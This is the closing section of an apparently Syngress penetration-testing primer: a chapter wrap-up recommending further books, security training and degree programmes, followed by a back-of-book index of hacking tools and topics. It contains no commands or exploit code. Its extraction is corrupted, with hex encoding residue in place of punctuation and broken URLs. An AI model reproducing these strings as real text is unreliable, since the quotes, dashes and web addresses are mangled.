 with a firm understand- ing of the basics you should feel confident and prepared to take on advanced  training in any of the areas we discussed
 there are many opportunities for you  to take your skill to the next level
 if you enjoyed learning by reading this book syngress has a series of truly amaz- ing hacking books over a wide range of topics including (listed alphabetically) n Aggressive Network Self-Defense: by neil r
 wyler Bruce Potter and chris Hurley n A Guide to Kernel Exploitation: by enrico Perla massimiliano oldani n Managed Code Rootkits: by erez metula n Nessus Network Auditing: by russ rogers n Ninja Hacking: by thomas wilhelm and Jason Andress n PenTestere28099s Open Source Tookit: by Jeremy faircloth chris Hurley and Jesse  Varsalone n Professional Penetration Testing: by thomas wilhelm n Seven Deadliest Attack Series l Seven Deadliest Microsoft Attacks: by rob kraus Brian Barber mike Borkin  and naomi Alpern l Seven Deadliest Network Attacks: by stacy Prowell rob kraus and mike  Borkin l Seven Deadliest Social Network Attacks: by carl timm and richard Perez l Seven Deadliest Unified Communications Attacks: by dan York l Seven Deadliest USB Attacks: by Brian Anderson and Barbara Anderson l Seven Deadliest Web Application Attacks: by mike shema l Seven Deadliest Wireless Technologies Attacks: by Brad Haines n Stealing the Network: The Complete Series: by Johnny long ryan russell and  timothy mullen if you are interested in a more e2809chands-one2809d learning approach there are many  great two- to five-day security boot camps available to you
 these classes are  often expensive and very labor-intensive but often highly worth their price of  admission
 the Black Hat conference usually offers a series of highly special- ized and focused classes delivered by some of the most well-known names in  security today
 there are literally dozens of security topics and specializations  to choose from at these events
 the trainings change from year to year but you  can find them on the Black Hat website at: http://www
blackhat
com the crew responsible for creating and distributing Backtrack linux also offer a  hands-on highly intense series of classes
 these classes will challenge you and  push you by making you work through a series of realistic scenarios
 even traditional universities are beginning to get into the security mode  today
 Just a few years ago it was difficult to find any security-related cur- riculum
 now most universities offer at least one class or devote time during  a class to cover some security
 dakota state University in madison sd offers  an entire Bachelore28099s degree in computer and network security along with a  mastere28099s degree in information Assurance and a doctorate of science with a  specialization in information Assurance
 0cWrapping Up the penetration Test ChApTER 7 155 if you are interested in pursuing a security-related degree through a higher  education institution you are highly encouraged to attend an nsA-accredited  center of Academic excellence
 these programs are information assurance  education degrees that have undergone a designation by the national security  Agency or the department of Homeland security to verify the value of the cur- riculum
 You can find more about this program at: http://www
nsa
gov/ia/  academic_outreach/nat_cae/index
shtml it is well worth your time to take a close look and examine the various security  testing methodologies including the open source security testing methodology  manual (osstmm)
 this book focused on the specific tools and methods used  in a penetration test
 osstmm provides security professionals with a well- defined mature framework that can be implemented in conjunction with many  of the topics covered in this book
 Another great penetration testing methodology can be found at: http://www
 vulnerabilityassessment
co
uk
 the Penetration testing framework (Ptf) is an  excellent resource for penetration testers and security assessment teams
 the  Ptf includes assessment templates as well as a robust list of tools that can be  used to conduct each phase
 WRAp Up if you read the book from front to back take a minute to stop and consider  all that you learned
 At this point you should have a solid understanding of  the various steps involved in a typical penetration test and the tools required  to complete each of the steps
 more importantly you should understand how  the penetration testing process flows and how to take the information and out- put from each of the phases and feed those results into the next phase
 many  people are eager to learn about hacking and penetration testing but most new- comers only understand how to run a single tool or complete a single step
  they refuse to see the big picture and often end up spinning their wheels in  frustration when their tool does not work or provides unexpected results
 this  group does not realize how the entire process works and how to leverage the  power of each phase to strengthen the phases that come after it
 for those of you who stuck with the book completed each of the examples  and gave an honest effort at following along at the very least this book should  have provided you with the knowledge and ability to see the big picture and  understand the importance of each phase
 You also now should have the ability to answer the question posed to you in a  scenario at the beginning of chapter 2: Assume you are an ethical penetration tester working for a security  company
 Your boss walks over to your office and hands you a piece   of paper
 e2809cI just got off the phone with the CEO of that company
   He wants my best employee to Pen Test his company e28093 thate28099s you
   Our Legal Department will be sending you an email confirming we   0cThe Basics of hacking and penetration Testing 156 have all of the proper authorizations and insurancee2809d
 You nod  accepting the job
 He leaves
 You flip over the paper a single word is  written on the paper e2809cSyngress
e2809d Ite28099s a company youe28099ve never heard of  before and no other information is written on the paper
 What now? ThE CIRCLE Of LIfE one of the greatest attributes of penetration testing and hacking is that you  never reach the end
 Just about the time you master a particular topic or tech- nique someone develops a new method attack or procedure
 that is not to  say that your original skillset is obsolete
 on the contrary a solid understand- ing of the basics provides you with a lifelong foundation for learning the  advanced topics and staying current with the rapid pace of change
 enjoy the journey! Patrick SUMMARy this chapter focused on the importance of writing the penetration testing report  and examined specific details about what needs to be included and poten- tial pitfalls for hackers who have never written a penetration testing report
  the importance of presenting a quality report to the client was emphasized
  the chapter concluded with suggestions about where you can go to further  enhance your hacking skills once you have mastered the basics
 specific recom- mendations for getting advanced training and becoming part of the security   community were also outlined
 Openmirrors
com 0c157 Index A Access maintaining 127 Back orifice 144 ncat 143e28093144 netbus 134e28093135 netcat 128e28093133 cryptcat 133e28093134 practicing 142e28093143 rootkits 135e28093141 detecting and defending against  141e28093142 Hacker defender 137e28093141 socat 143e28093144 subseven (sub7) 144 Access control lists (Acls) 56 Acls
 See Access control lists  (Acls) Active reconnaissance 18 25 Advanced security concepts 153 AfP 67 e2809cAllintitle:e2809d directive 23 APt (Advanced Package tool) 4 Attack vectors 66 108 121 Authorization 3 B Back orifice 144 Backtrack 5 6 26e2809327 36 69  83e2809384 working with 6e280939 Backtrack linux 3e280936 154 Base64 116 Bdcli100
exe 137 Ben owned 38 80 86 118 119 Bind and reverse payloads difference  between 80 Bing 26 Black Hat conference 154 Brute forcing letter combinations 87 Burp Proxy 125 Burp suite 125 C cAnVAs 71 carl-fredrik 134 chat rooms 152 circle of life 156 cisco AsA firewall 20e2809321 code injection attacks 116e28093120 core impact 62 71 cross-site scripting (xss) 121e28093123 cryptcat 133e28093134 D dakota state University website 22 dawes rogan 111 defcon 152e28093153 defcon 6 144 defcon 12 70 defcon 13 21 de-ice cds 102 dHcP server 7 8 dig 35e2809336 directxploit 144 dns servers
 See domain name  systems (dns) servers domain name systems (dns)  servers 28 29 extracting information from  32e2809336 dsniff 94 E e-mail address 25 26 68 77 e-mail server extracting information  from 36 e2809ceth0e2809d interface 7e280938 ethereal 95 ethical hackers 2 3 18 57 and malicious hacker 3 ettercap 104 executive summary 147 exploitation 13 65 ettercap 104 fast-track Autopwn 97e28093100 Hydra 67 103e28093104 John the ripper 81e2809389 macof program 93e2809397 medusa 67e2809370 metasploit 70e2809381 104e28093105 network traffic sniffing 92e2809393 password resetting 89e2809392 practicing 100e28093103 rainbowcrack 104 target and desired goal 103e28093105 wireshark 104 f facebook 25e2809326 e2809cfail closede2809d concept of 94 e2809cfail opene2809d concept of 94 fast-track Autopwn 97e28093100 fdisk tool 84 fedora security spin 14 e2809cfiletype:e2809d directive 24 e2809cfirst order xsse2809d 123 fPing 47 ftP 67 96 97 G gmail 25 google 21 22e2809326 google cache 23e2809324 google-fu 22 40 google Hacking 21 Google Hacking for Penetration Testers  21 40 graphical user interface (gUi)  48e2809349 gUi
 See graphical user interface  (gUi) h Hacker defender 137e28093141 Hacking lab use and creation of  9e2809310 Harvester 26e2809328 68 accessing 26e2809327 output 28 Hash 82 Hd moore 70 71 Hobbit 128 Host command 29 31e2809332 33 output 32 Hotmail 25 hsdef100 file 137 0cIndex 158 HttP 67 Httrack 19e2809322 accessing 19 Hub 93 hxdef100
exe 137 hxdef100
ini 137 140 Hydra 67 103e28093104 icmP echo request packets 46 I e2809cifconfige2809d 7 8 imAP 67 information gathering
 See  reconnaissance insecure
org 62 internet 108 e2809cintitle:e2809d directive 23 e2809cinurl:e2809d directive 23 
iso image 5 J John the ripper (Jtr) 81e2809389 103 K kAtAnA 14 k-start dragon 19 72 98 112 L lan manager (lm) 86 linux 5 46 57 passwords cracking of 88e2809389 linux Backtrack 77 lm
 See lan manager (lm) lodge david 108 long Johnny defcon 13 21 google Hacking database  (gHdB) 40 e2809cloe2809d interface 7e280938 M macof program 93e2809397 maintaining access
 See Access  maintaining malicious hacker and ethical  hackers 3 28 e2809cman hoste2809d command 32 martorella christian 26 matriux 14 medusa 67e2809370 practicing 103 metagoofil 36e2809337 information gathering with 69 metasploit 16 17 70e2809381 94 97  102 146 metasploitable 102 e2809cmetasploit Unleashede2809d 102 meterpreter 79e2809381 83 104e28093105  132e28093133 microsoft 5 7 86 87 mobman 144 ms08-067 73e2809374 75 76 ms09-001 74 75 msfconsole 72 73 ms-sQl 67 myspace 25 mysQl 67 117 N nessus 58e2809361 73 146 screenshot of 59 setting up 60 steps to install 58e2809359 netbus 134e28093135 144 netcat 128e28093133 139 142 cryptcat 133e28093134 netcraft 31 netware ncP 67 network interface card (nic) 92e2809393 network traffic sniffing 92e2809393 nic
 See network interface card  (nic) nikto 108e28093109 nmap 48 73 131 146 and null scans 56e2809357 and sYn scan 51e2809352 and tcP connect scan 49e2809351 and UdP scans 52e2809355 and xmas scan 55e2809356 nntP 67 ns lookup 34e2809335 e2809cnslookupe2809d command 34 null scans using nmap to perform  56e2809357 O offensive security 3 online password crackers 67 open source security testing  methodology manual  (osstmm) 155 open web Application security  Project (owAsP)  organization 123 125 osstmm
 See open source security  testing methodology manual  (osstmm) osx passwords cracking 88 owAsP top ten Project 124 p Paros Proxy 125 Passive reconnaissance 18 21 Password dictionary 68 87 Password hashes 82 83 86 Password resetting 89e2809392 e2809cpatch
exee2809d 135 b"Patervas maltego ce 40e2809341" Payloads 13 71 79 reverse 79 Pc Anywhere 67 Penetration testing 1 66 145 advanced security concepts  152e28093153 Backtrack working with 6e280939 Backtrack linux 3e280936 books for 154 circle of life 156 definition of 1 getting started 2e280933 guidelines 153e28093155 hacking lab use and creation of  9e2809310 phases of 10 four-step model 13e2809314 report writing 146 detailed report 147e28093149 executive summary 147 raw output 149e28093152 Penetration testing framework  (Ptf) 155 PgP server 26 Ping and ping sweeps 46e2809348 Poc attacks
 See Proof of concept  (Poc) attacks PoP3 67 Port numbers and corresponding  services 45 Port scanning 13 48 null scans and nmap 56e2809357 sYn scan and nmap 51e2809352 tcP connect scan and nmap 49e2809351 three-way handshake 49 57e2809358 UdP scans and nmap 52e2809355 xmas scan and nmap 55e2809356 Poweroff command 8 Proof of concept (Poc) attacks 1  101 148 Ptf
 See Penetration testing  framework (Ptf) Python script 26 37 0cIndex   159 R rainbowcrack 104 rapid 7 71 reboot command 8 reconnaissance 10e2809311 13 15 dig 35e2809336 dns servers 32e2809336 e-mail server extracting  information from 36 metagoofil 36e2809337 finding attackable targets 39 google directives 22e2809326 host command 31e2809332 Harvester 26e2809328 Httrack 19e2809322 information gathering advanced  topics in 40e2809341 Google Hacking for Penetration  Testers 40 b"Johnny longs google Hacking " database (gHdB) 40 b"Patervas maltego ce 40e2809341" search engine Assessment tool  (seAt) 40 search engine directives for sites  other than google 40 netcraft 31 ns lookup 34e2809335 practicing 39e2809340 social engineering 38e2809339 whois 28e2809331 e2809creferral Url:e2809d 30 remote access service 67e2809370 report writing 146 detailed report 147e28093149 executive summary 147 raw output 149e28093152 reverse payloads 79 80 rexec 67 rfc 55 rlogin 67 rootkits 128 135 detecting and defending against  141e28093142 Hacker defender 137e28093141 practice 143 S saint 62 sAm (security Account manager)  file 83e2809384 85 samdump2 84e2809385 86 sAm Juicer tool 81 83e2809384 scanning 43 pings and ping sweeps 46e2809348 port scanning 48 null scans and nmap 56e2809357 sYn scan and nmap 51e2809352 tcP connect scan and nmap  49e2809351 three-way handshake 49 UdP scans and nmap 52e2809355 wrap up 57e2809358 xmas scan and nmap 55e2809356 practicing 61e2809362 steps in 43e2809346 vulnerability scanning 58e2809361 search engine Assessment tool  (seAt) 40 search engine directives for sites  other than google 40 seAt
 See search engine Assessment  tool (seAt) security Account manager file
  See sAm (security Account  manager) file security-related curriculum 154 155 select statement 118 7zip 150 e2809csite reporte2809d 31 smtP-AUtH 67 sniffing 92e2809393 snmP 67 social engineering 38e2809339 spidering 111e28093114 sQl
 See structured Query language  (sQl) ssH 58 67 ssHv2 67 Star Wars 2 e2809cstealth scane2809d 51 stored xss 123 structured Query language (sQl)  117 118 subseven (sub7) 144 sullo chris 108 sun microsystem 5 e2809cswiss army knifee2809d
 See netcat sYn/Ack packet 49 syngress
com 29 31 32 154 sYn scan 51e2809352 System32 directory 132e28093133 T tcP (transmission control  Protocol) connect scan  49e2809351 53 telnet 58 67 three-way handshake 49 truecrypt 150 twitter 25e2809326 U UdP (User datagram Protocol) 53 and nmap 52e2809355 Usenet 25 v VirtualBox 5 Virtual Pc 5 Vmware image 5 Vmware Player 5e280936 Vnc software 67 76 Vulnerability assessment and  penetration testing 1e280932 Vulnerability scanner 71 Vulnerability scanning 13 45  58e2809361 W web-based exploitation 107 code injection attacks 116e28093120 cross-site scripting 121e28093123 interrogating web servers 108e28093109 spidering 111e28093114 webscarab 112 113 115e28093116 websecurify 110e28093111 web form 67 webgoat 123e28093124 webscarab 111e28093113 115e28093116 websecurify 110e28093111 whois 28e2809331 wilhelm thomas 102 windows version 46 wireshark 94e2809396 97 104 X xmas scan and nmap 55e2809356 xss
 See cross-site scripting (xss) Openmirrors
com 0c]']
